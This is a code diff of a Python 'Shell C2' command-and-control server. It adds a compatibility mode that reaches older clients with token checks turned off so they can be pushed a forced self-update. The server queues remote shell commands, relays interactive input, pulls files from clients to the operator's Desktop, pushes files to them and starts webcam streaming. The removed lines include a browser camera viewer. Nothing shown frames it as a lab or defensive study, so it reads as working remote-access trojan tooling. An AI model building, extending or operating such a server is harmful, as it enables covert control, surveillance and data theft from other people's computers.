@@ -1,19 +1,41 @@
 #!/usr/bin/env python3
 """
-HTTP-based C2 server with multi-client, streaming output, interactive stdin,
-and cancel support. Runs on Mac behind Cloudflare Tunnel.
-Usage: python3 server.py
+Shell C2 — compatibility server for old short-polling clients (pre-long-poll).
+
+Use this to reach a client still running the old architecture (commit 0a32933
+and earlier). The old client polls /cmd with a short HTTP timeout (~10s) and
+expects an immediate response (empty string if nothing is pending). The current
+server.py holds the connection for up to 30s which triggers a timeout + backoff
+loop on the old client, making it effectively unreachable.
+
+Workflow:
+  1. Stop server.py
+  2. python3 older.py
+  3. Wait for old client to reconnect (~15-60s backoff)
+  4. Send 'update' to push the client to v3.1.1
+  5. Wait ~1-2 min for client to self-update and watchdog to relaunch
+  6. Stop older.py
+  7. python3 server.py   ← new client uses long-poll, fully compatible
+
+Endpoints supported (old client uses all of these):
+  GET  /cmd         – returns pending command immediately (no long-poll hold)
+  GET  /signal      – returns pending cancel signal
+  GET  /stdin       – returns pending stdin lines
+  GET  /ping        – health check, returns "pong"
+  GET  /fetch       – client fetches a file queued via 'put'
+  POST /result      – client posts final command result
+  POST /stream      – client posts live output chunk
+  POST /interactive – client sets interactive session flag
+  POST /upload      – client uploads a file to ~/Desktop
+  POST /camera_frame – camera frame (passthrough, not displayed here)
+
+Endpoints NOT included (new server.py only):
+  /camera_snapshot, /camera_view, /camera_signal
 """
 
-VERSION = "3.1.1"
-
-# ── Auth ─────────────────────────────────────────────────────────────────────
-# Set TOKEN to any hard-to-guess string (e.g. a random UUID).
-# Clients must send it as the X-Token header on every request.
-# ENFORCE_TOKEN = True → unknown callers get 403 (production mode).
-TOKEN = "CHANGE_ME_TO_A_SECRET"
-ENFORCE_TOKEN = True
-# ─────────────────────────────────────────────────────────────────────────────
+VERSION = "compat-old-client"
+TOKEN = "CHANGE_ME_TO_A_SECRET"  # must match server.py
+ENFORCE_TOKEN = False           # old clients don't send token — let them through
 
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from socketserver import ThreadingMixIn
@@ -26,17 +48,12 @@ import queue
 import signal
 import os
 import readline  # enables arrow-key history in input()
-import io
 
 # Per-client state
 clients = {}
 lock = threading.Lock()
 active_client = None
 result_queue = queue.Queue(maxsize=500)  # (client_id, kind, body)
-camera_frames = {}  # client_id -> latest frame data
-camera_last_frame_at = {}
-camera_start_times = {}
-streaming_clients = set()
 pending_files = {}  # client_id -> (filename, bytes) waiting for client to fetch
 
 
@@ -47,39 +64,11 @@ def get_or_create_client(client_id):
             "last_checkin": 0,
             "pending_command": None,
             "pending_signal": None,
-            "pending_camera_signal": None,
             "pending_stdin": [],
             "command_running": False,
             "interactive": False,
-            "cmd_event": threading.Event(),  # set when a command is ready
         }
     return clients[client_id]
-
-
-def set_command(client, cmd):
-    client["pending_command"] = cmd
-    client["cmd_event"].set()
-
-
-def clear_camera_state(client_id):
-    camera_frames.pop(client_id, None)
-    camera_last_frame_at.pop(client_id, None)
-    camera_start_times.pop(client_id, None)
-    streaming_clients.discard(client_id)
-
-
-def is_camera_stream_active(client_id, now=None):
-    if client_id not in streaming_clients:
-        return False
-    now = time.time() if now is None else now
-    last_frame_at = camera_last_frame_at.get(client_id)
-    if last_frame_at and (now - last_frame_at) <= 5:
-        return True
-    start_time = camera_start_times.get(client_id)
-    if start_time and (now - start_time) <= 10:
-        return True
-    clear_camera_state(client_id)
-    return False
 
 
 def get_prompt():
@@ -90,7 +79,6 @@ def get_prompt():
         return f"{active_client}> "
     return "shell> "
 
-
 def safe_print(msg):
     """Print a status message without clobbering the readline input buffer.
     Saves the current partially-typed line, prints the message on its own
@@ -100,12 +88,12 @@ def safe_print(msg):
     sys.stdout.write(f"\r\033[K{msg}\n{prompt}{buf}")
     sys.stdout.flush()
 
+
 def cancel_shortcut(signum, frame):
     """Handle Ctrl+\\ to cancel the running remote command on the active client."""
     with lock:
         if not active_client:
             safe_print("[*] No active client. Use 'use <id>' to select one.")
-            return
             return
         client = clients.get(active_client)
         if client and (client["command_running"] or client["pending_command"]):
@@ -147,10 +135,6 @@ class Handler(BaseHTTPRequestHandler):
         return ids[0] if ids else None
 
     def _check_token(self):
-        """Return True if the request carries the correct token (or enforcement is off).
-        Checks X-Token header first, then ?token= query param as fallback.
-        When ENFORCE_TOKEN is False the check always passes (compatibility mode).
-        """
         if not ENFORCE_TOKEN:
             return True
         provided = (
@@ -164,45 +148,31 @@ class Handler(BaseHTTPRequestHandler):
         self.send_response(code)
         self.send_header("Content-Type", "text/plain")
         self.send_header("Content-Length", str(len(body)))
-        # Always close: prevents cloudflared HTTP/2 reuse issues
         self.send_header("Connection", "close")
         self.end_headers()
         self.wfile.write(body)
 
     def do_GET(self):
-        if not self._check_token():
-            self._respond(403, b"forbidden")
-            return
         parsed = urlparse(self.path)
         path = parsed.path
         client_id = self._parse_client_id()
+
+        if not self._check_token():
+            self._respond(403, b"forbidden")
+            return
 
         if path == "/cmd":
             if not client_id:
                 self._respond(400, b"missing id")
                 return
-            # Long-poll: hold the connection open up to 30s waiting for a command.
-            # This replaces the client's adaptive sleep — 0 CPU/network when idle.
-            LONG_POLL_TIMEOUT = 30  # seconds
+            # SHORT-POLL: return immediately. Empty string if no command pending.
+            # The old client sleeps briefly between polls — no 30s hold here.
             with lock:
                 client = get_or_create_client(client_id)
                 client["last_checkin"] = time.time()
-                event = client["cmd_event"]
                 cmd = client["pending_command"] or ""
                 if cmd:
                     client["pending_command"] = None
-                    event.clear()
-            if not cmd:
-                # Wait outside the lock so other threads can set a command
-                event.wait(timeout=LONG_POLL_TIMEOUT)
-                with lock:
-                    client = clients.get(client_id)
-                    if client:
-                        client["last_checkin"] = time.time()
-                        cmd = client["pending_command"] or ""
-                        if cmd:
-                            client["pending_command"] = None
-                            client["cmd_event"].clear()
             self._respond(200, cmd.encode())
 
         elif path == "/signal":
@@ -214,17 +184,6 @@ class Handler(BaseHTTPRequestHandler):
                 client["last_checkin"] = time.time()
                 sig = client["pending_signal"] or ""
                 client["pending_signal"] = None
-            self._respond(200, sig.encode())
-
-        elif path == "/camera_signal":
-            if not client_id:
-                self._respond(200, b"")
-                return
-            with lock:
-                client = get_or_create_client(client_id)
-                client["last_checkin"] = time.time()
-                sig = client["pending_camera_signal"] or ""
-                client["pending_camera_signal"] = None
             self._respond(200, sig.encode())
 
         elif path == "/stdin":
@@ -247,7 +206,6 @@ class Handler(BaseHTTPRequestHandler):
             self._respond(200, b"pong")
 
         elif path == "/fetch":
-            # Client fetches a file the operator pushed via 'put'
             if not client_id:
                 self._respond(400, b"missing id")
                 return
@@ -266,74 +224,17 @@ class Handler(BaseHTTPRequestHandler):
             else:
                 self._respond(204, b"")  # no file pending
 
-        elif path == "/camera_snapshot":
-            if not client_id:
-                self._respond(400, b"missing id")
-                return
-            with lock:
-                frame = camera_frames.get(client_id)
-                last_frame_at = camera_last_frame_at.get(client_id)
-            if last_frame_at and (time.time() - last_frame_at) > 5:
-                self._respond(204, b"")
-                return
-            if not frame:
-                self._respond(204, b"")
-                return
-            self.send_response(200)
-            self.send_header("Content-Type", "image/jpeg")
-            self.send_header("Content-Length", str(len(frame)))
-            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
-            self.send_header("Connection", "close")
-            self.end_headers()
-            self.wfile.write(frame)
-
-        elif path == "/camera_view":
-            if not client_id:
-                self._respond(400, b"missing id")
-                return
-            html = f"""<!DOCTYPE html>
-<html><head><meta charset=utf-8>
-<title>Camera — {client_id}</title>
-<style>
-  body{{margin:0;background:#111;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:monospace;color:#0f0}}
-  img{{max-width:100%;max-height:90vh;border:1px solid #333}}
-  p{{font-size:12px;margin:6px 0 0;opacity:.6}}
-</style>
-</head>
-<body>
-  <img id=f src='/camera_snapshot?id={client_id}&t=0' alt='No frame yet'>
-  <p id=s>Connecting...</p>
-<script>
-  var img=document.getElementById('f'),st=document.getElementById('s'),n=0,ok=0,bad=0,busy=false;
-  function refresh(){{
-    if(busy)return;
-    busy=true;
-    var t=new Image();
-    t.onload=function(){{img.src=t.src;ok++;bad=0;busy=false;st.textContent='Live \u2014 frame '+ok;}}
-    t.onerror=function(){{bad++;busy=false;if(bad>10)st.textContent='No signal ('+bad+' misses)';}}
-    t.src='/camera_snapshot?id={client_id}&t='+(++n);
-  }}
-  refresh();
-  setInterval(refresh,200);
-</script>
-</body></html>"""
-            body = html.encode()
-            self.send_response(200)
-            self.send_header("Content-Type", "text/html; charset=utf-8")
-            self.send_header("Content-Length", str(len(body)))
-            self.send_header("Connection", "close")
-            self.end_headers()
-            self.wfile.write(body)
         else:
             self._respond(404)
 
     def do_POST(self):
-        if not self._check_token():
-            self._respond(403, b"forbidden")
-            return
         parsed = urlparse(self.path)
         path = parsed.path
         client_id = self._parse_client_id()
+
+        if not self._check_token():
+            self._respond(403, b"forbidden")
+            return
 
         length = int(self.headers.get("Content-Length", 0))
         raw_body_bytes = self.rfile.read(length)
@@ -366,7 +267,6 @@ class Handler(BaseHTTPRequestHandler):
                 except queue.Full:
                     try:
                         evicted = result_queue.get_nowait()
-                        # If we accidentally grabbed a result, put it back
                         if evicted[1] == "result":
                             try:
                                 result_queue.put_nowait(evicted)
@@ -377,7 +277,6 @@ class Handler(BaseHTTPRequestHandler):
             self._respond(200, b"ok")
 
         elif path == "/interactive":
-            # Explicit interactive state flag — no marker parsing needed
             if client_id:
                 with lock:
                     client = get_or_create_client(client_id)
@@ -385,18 +284,14 @@ class Handler(BaseHTTPRequestHandler):
             self._respond(200, b"ok")
 
         elif path == "/upload":
-            # Endpoint for clients to upload a file to the operator's Desktop
             if not client_id:
                 self._respond(400, b"missing id")
                 return
             parsed_path = urlparse(self.path)
             params = parse_qs(parsed_path.query)
             filename = params.get("filename", ["unknown_file"])[0]
-            # Sanitize: keep only the basename, then hard-reject any remaining
-            # path separator characters and empty names so a crafted filename
-            # cannot escape ~/Desktop even on non-POSIX systems.
             filename = os.path.basename(filename)
-            if not filename or '/' in filename or '\\' in filename:
+            if not filename or "/" in filename or "\\" in filename:
                 self._respond(400, b"invalid filename")
                 return
             with lock:
@@ -404,7 +299,6 @@ class Handler(BaseHTTPRequestHandler):
                 client["last_checkin"] = time.time()
                 client["command_running"] = False
                 client["pending_stdin"] = []
-            # Read raw bytes
             raw_bytes = raw_body_bytes
             desktop = os.path.expanduser("~/Desktop")
             dest = os.path.join(desktop, filename)
@@ -421,15 +315,14 @@ class Handler(BaseHTTPRequestHandler):
             self._respond(200, b"ok")
 
         elif path == "/camera_frame":
+            # Accept frames so the client doesn't error — we just discard them.
+            # Camera viewing requires server.py (newer client).
             if not client_id:
                 self._respond(400, b"missing id")
                 return
             with lock:
                 client = get_or_create_client(client_id)
                 client["last_checkin"] = time.time()
-                camera_frames[client_id] = raw_body_bytes
-                camera_last_frame_at[client_id] = time.time()
-                streaming_clients.add(client_id)
             self._respond(200, b"ok")
 
         else:
@@ -463,7 +356,6 @@ def result_printer():
 def _resolve_client(target):
     """Resolve a target string to a client ID. Must be called with lock held.
     Supports: index number, exact match, or case-insensitive partial match."""
-    # Try by number
     try:
         idx = int(target) - 1
         client_list = list(clients.keys())
@@ -471,10 +363,8 @@ def _resolve_client(target):
             return client_list[idx]
     except ValueError:
         pass
-    # Exact match
     if target in clients:
         return target
-    # Partial match (case-insensitive)
     for cid in clients:
         if target.lower() in cid.lower():
             return cid
@@ -494,7 +384,6 @@ def input_loop():
 
         stripped = cmd.strip().lower()
 
-        # --- Built-in commands (always handled, even during interactive sessions) ---
         BUILTINS = {
             "cancel",
             "sessions",
@@ -608,7 +497,6 @@ def input_loop():
                 match = _resolve_client(target)
                 if match:
                     clients[match]["pending_command"] = "exit"
-                    clients[match]["cmd_event"].set()
                     clients[match]["pending_stdin"] = []
                     print(f"[*] Exit command sent to {match}.")
                     if active_client == match:
@@ -637,8 +525,12 @@ def input_loop():
 
         if stripped == "help":
             print("╔═══════════════════════════════════════════════════╗")
-            print("║  Shell C2 — Command Reference                    ║")
+            print("║  Shell C2 — Compatibility Server (older.py)       ║")
             print("╚═══════════════════════════════════════════════════╝")
+            print()
+            print("  This server speaks the OLD short-poll protocol.")
+            print("  Use it to reach a client running pre-long-poll code,")
+            print("  send 'update', then switch back to server.py.")
             print()
             print("  SESSION MANAGEMENT:")
             print("    sessions          List all connected clients")
@@ -647,60 +539,41 @@ def input_loop():
             print("    kill <id>         Send exit to client (removes it)")
             print("    remove <id>       Remove stale client from list")
             print()
-            print("  EXAMPLES:")
-            print("    use 1             Select client #1")
-            print("    use ANIKETB52D    Select by name (partial match)")
-            print("    kill 1            Kill client #1 (full cleanup)")
-            print("    kill ANIKETB52D   Kill by name")
-            print()
             print("  COMMAND CONTROL:")
             print("    cancel            Abort running command on active client")
             print("    Ctrl+\\            Same as cancel (keyboard shortcut)")
             print()
-            print("  REMOTE COMMANDS (sent to client):")
-            print(
-                "    get <filepath>    Download file from client to ~/Desktop (abs or relative to cwd)"
-            )
-            print(
-                "    put <filepath>    Upload local file to client's script dir (abs or relative)"
-            )
+            print("  REMOTE COMMANDS (sent to old client):")
+            print("    update            Force self-update from GitHub now  ← USE THIS")
+            print("    get <filepath>    Download file from client to ~/Desktop")
+            print("    put <filepath>    Upload local file to client's script dir")
             print("    stream            Start webcam streaming on client")
             print("    stopstream        Stop webcam streaming")
             print("    version           Show client version, host, PID")
-            print("    update            Force self-update from GitHub now")
-            print("    gui:<cmd>         Launch GUI on user's desktop")
-            print("    notimeout:<cmd>   Run without 300s timeout")
-            print()
-            print("  EXAMPLES:")
-            print("    stream            Start webcam → view in browser")
-            print("    stopstream        Stop webcam")
-            print("    gui:explorer .    Open Explorer on remote desktop")
-            print("    gui:code .        Open VS Code in current dir")
-            print("    notimeout:ping -t 8.8.8.8   Run forever until cancel")
-            print()
-            print("  SHORTCUTS (auto-routes to gui):")
-            print("    camera            Open Windows Camera app")
-            print("    recorder          Open Sound Recorder")
-            print("    settings          Open Windows Settings")
-            print("    calc              Open Calculator")
-            print()
-            print("  WEBCAM VIEWING:")
-            print(
-                "    After 'stream', open: http://localhost:4444/camera_view?id=<client_id>"
-            )
             print()
             print("  SERVER:")
             print("    exit              Shut down THIS server (not client)")
             print("    help              Show this message")
             print()
-            print("  ⚠  'exit' shuts the SERVER. Use 'kill <id>' to stop a client.")
+            print("  WORKFLOW:")
+            print("    1. Wait for old client to connect (check 'sessions')")
+            print("    2. use <id>   — select the client")
+            print("    3. update     — trigger self-update to v3.1.1")
+            print("    4. Wait 1-2 min for watchdog to relaunch updated client")
+            print("    5. exit       — stop older.py")
+            print("    6. python3 server.py   — back to normal long-poll server")
+            print()
+            print(
+                "  ⚠  'exit' shuts THIS SERVER only. Use 'kill <id>' to stop a client."
+            )
             continue
 
         if stripped == "exit":
             print("[*] Shutting down server.")
             os._exit(0)
 
-        if stripped == "stream":
+        # stream / stopstream — pass through as raw commands (old client handles them)
+        if stripped in ("stream", "stopstream"):
             with lock:
                 if not active_client:
                     print("[*] No active client. Use 'use <id>' to select one.")
@@ -714,40 +587,10 @@ def input_loop():
                         f"[!] Command already running on {active_client}. Cancel first."
                     )
                     continue
-                if (
-                    is_camera_stream_active(active_client)
-                    or client["pending_command"] == "stopstream"
-                    or client["pending_camera_signal"] == "stopstream"
-                ):
-                    print(
-                        f"[!] Already streaming from {active_client}. Use 'stopstream' first."
-                    )
-                    continue
-                client["pending_camera_signal"] = None
-                client["pending_command"] = "stream"
-                client["cmd_event"].set()
-                streaming_clients.add(active_client)
-                camera_start_times[active_client] = time.time()
-            print(f"[*] Camera stream started on {active_client}")
-            print(f"[*] View at: http://localhost:4444/camera_view?id={active_client}")
-            print("[*] Waiting for client to connect...")
-            continue
-
-        if stripped == "stopstream":
-            with lock:
-                if not active_client:
-                    print("[*] No active client. Use 'use <id>' to select one.")
-                    continue
-                client = clients.get(active_client)
-                if not client:
-                    print(f"[!] Client {active_client} not found.")
-                    continue
-                clear_camera_state(active_client)
-                client["pending_camera_signal"] = "stopstream"
-                client["pending_command"] = "stopstream"
-                client["cmd_event"].set()
                 client["pending_stdin"] = []
-            print(f"[*] Camera stream stopped on {active_client}")
+                client["pending_command"] = stripped
+                client["command_running"] = True
+            print(f"[*] '{stripped}' queued for {active_client}.")
             continue
 
         if stripped.startswith("get "):
@@ -772,7 +615,6 @@ def input_loop():
                     continue
                 client["pending_stdin"] = []
                 client["pending_command"] = f"get:{filename}"
-                client["cmd_event"].set()
                 client["command_running"] = True
             print(f"[*] Requesting '{filename}' from {active_client}...")
             continue
@@ -780,9 +622,7 @@ def input_loop():
         if stripped.startswith("put "):
             localpath = cmd.strip()[4:].strip()
             if not localpath:
-                print(
-                    "[*] Usage: put <local-filepath>  (e.g. put ~/Desktop/tool.exe or put tool.exe)"
-                )
+                print("[*] Usage: put <local-filepath>")
                 continue
             localpath = os.path.expanduser(localpath)
             if not os.path.isabs(localpath):
@@ -813,7 +653,6 @@ def input_loop():
                 pending_files[active_client] = (filename, data)
                 client["pending_stdin"] = []
                 client["pending_command"] = f"put:{filename}"
-                client["cmd_event"].set()
                 client["command_running"] = True
             print(
                 f"[*] Pushing '{filename}' ({len(data):,} bytes) to {active_client}..."
@@ -830,7 +669,6 @@ def input_loop():
                 print(f"[!] Client {active_client} not found.")
                 continue
             if client["command_running"]:
-                # Command already running — route input as stdin
                 client["pending_stdin"].append(cmd)
             else:
                 if client["pending_command"]:
@@ -839,7 +677,6 @@ def input_loop():
                     )
                 client["pending_stdin"] = []
                 client["pending_command"] = cmd
-                client["cmd_event"].set()
                 client["command_running"] = True
 
 
@@ -847,7 +684,6 @@ def status_printer():
     shown_warnings = set()
     while True:
         time.sleep(10)
-        # Copy state under lock, print after releasing
         alerts = []
         cleared = []
         with lock:
@@ -869,10 +705,11 @@ def status_printer():
 if __name__ == "__main__":
     PORT = 4444
     server = DualStackHTTPServer(("::", PORT), Handler)
-    print(f"[*] Shell C2 Server v{VERSION}")
+    print(f"[*] Shell C2 Compatibility Server ({VERSION})")
     print(f"[*] Listening on port {PORT} (IPv4 + IPv6)")
-    print("[*] Waiting for clients to connect...")
-    print("[*] Type 'help' for built-in commands\n")
+    print("[*] SHORT-POLL mode — compatible with pre-long-poll clients")
+    print("[*] Waiting for old client to connect...")
+    print("[*] Type 'help' for workflow instructions\n")
 
     threading.Thread(target=input_loop, daemon=True).start()
     threading.Thread(target=result_printer, daemon=True).start()
